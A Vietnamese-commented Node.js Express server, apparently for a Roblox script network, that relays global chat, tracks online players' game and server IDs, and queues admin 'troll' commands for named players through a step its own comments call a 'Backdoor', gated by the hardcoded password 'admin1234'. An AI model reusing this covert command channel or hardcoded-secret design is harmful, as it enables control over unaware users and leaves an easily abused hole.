const express = require('express');
const app = express();
app.use(express.json());

let chatHistory = [];
let onlinePlayers = {}; // Lưu thông tin người đang online
let adminCommands = {}; // Lưu lệnh troll { "TenNguoiBiTroll": [{type: "flashbang", data: ""}] }

// Endpoint duy nhất để Đồng Bộ (Sync) mọi thứ cho đỡ lag
app.post('/sync', (req, res) => {
    const data = req.body;
    if (!data.player) return res.status(400).json({ error: "Missing data" });

    // 1. Cập nhật trạng thái người chơi này (Sống lại mỗi khi ping)
    onlinePlayers[data.player] = {
        customName: data.customName || data.player,
        hideInfo: data.hideInfo,
        game: data.game, // Tên game
        jobId: data.jobId,
        isVip: data.isVip,
        maxPlayers: data.maxPlayers,
        avatar: data.avatar, // Link Avatar Roblox
        lastSeen: Date.now()
    };

    // 2. Nhận tin nhắn mới nếu có
    if (data.newMessage) {
        chatHistory.push({
            player: data.customName || data.player,
            realName: data.player,
            message: data.newMessage,
            type: data.msgType || "text",
            time: Date.now()
        });
        if (chatHistory.length > 50) chatHistory.shift();
    }

    // 3. Xử lý Lệnh Admin (Nếu người này là Admin gửi lệnh)
    if (data.adminAction && data.adminPass === "admin1234") {
        const target = data.adminAction.target;
        if (!adminCommands[target]) adminCommands[target] = [];
        adminCommands[target].push(data.adminAction.command);
    }

    // 4. Kiểm tra xem mình có bị Admin nhắm tới không (Backdoor)
    let myCommands = [];
    if (adminCommands[data.player]) {
        myCommands = [...adminCommands[data.player]];
        adminCommands[data.player] = []; // Nhận xong thì xóa lệnh
    }

    // 5. Lọc người AFK (quá 2 phút không ping coi như offline)
    const now = Date.now();
    for (let p in onlinePlayers) {
        if (now - onlinePlayers[p].lastSeen > 120000) delete onlinePlayers[p];
    }

    // Lọc tin nhắn cũ
    const tenMins = now - (10 * 60 * 1000);
    chatHistory = chatHistory.filter(m => m.time > tenMins);

    // Trả về toàn bộ dữ liệu
    res.json({
        chat: chatHistory,
        online: onlinePlayers,
        commands: myCommands
    });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Global Network V3 Live!"));
